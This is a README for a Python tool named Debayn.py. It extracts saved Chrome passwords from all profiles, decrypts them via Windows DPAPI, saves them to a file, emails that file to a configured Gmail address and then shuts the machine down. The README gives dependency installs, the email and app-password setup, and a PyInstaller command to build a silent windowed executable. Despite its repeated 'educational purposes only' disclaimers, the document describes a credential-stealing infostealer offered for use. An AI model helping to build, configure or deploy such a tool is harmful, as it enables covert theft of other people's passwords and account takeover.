⚠️ **Disclaimer and Notice of Responsibility**


This project is strictly for **educational purposes only**. Any misuse—such as unauthorized data access or password extraction from devices you do not own—is illegal and unethical. You assume full responsibility for your actions. The author is not liable for any damage, misuse, or legal issues caused by this tool.


By using or modifying
this script, you accept full responsibility for your actions. The creator of this guide and tool is not liable for any misuse, damage, or legal repercussions that may result.


🔎 **How This Script Works**

This script interacts with Google Chrome's built-in password manager, which stores login credentials encrypted using the Windows Data Protection API (DPAPI).


📦 **Dependencies**

Run these in your terminal before using:

pip install pywin32


pip install pycryptodomex


✉️ **Email Configuration**

Inside the script, configure:

from_email = "YOUR_EMAIL@gmail.com"

password = "APP_PASSWORD"  # Use Gmail App Password

to_email = "RECEIVER_EMAIL@gmail.com"


To generate a Gmail App Password:

  - Enable 2-Step Verification on your Google account.
  
  - Visit: https://myaccount.google.com/apppasswords
  
  - Generate a password for "Mail" > "Other (Custom name)".
  
  - Use that password in your script.
  

⚠️ **Legal & Ethical Notice**

Using this tool on any system you do not own or without consent may:

  - Violate privacy laws
  
  - Breach cybersecurity regulations
  
  - Lead to legal prosecution
  

💡 **Building into .exe (Optional)**

If you want to convert this script into a Windows executable:

pyinstaller --onefile --windowed "YourFileName.py"

📌 **Note:* If the filename contains spaces, wrap it in quotes.

Run the script

python Debayn.py

It will:

  - Extract passwords from all Chrome profiles (e.g. Default, Profile 1, etc.)
    
  - Decrypt them using your machine's encryption key
    
  - Save them in chrome_passwords.txt
    
  - Email the file to the destination set in the script
    
  - Shutdown the system
    
 
chrome_passwords.txt: File that stores all extracted credentials.

Email sent via Gmail with this file as attachment.


🚫**NEVER use this tool maliciously.**

It is provided to:

  - Learn about browser encryption
  
  - Protect your own credentials
  
  - Understand real-world software security


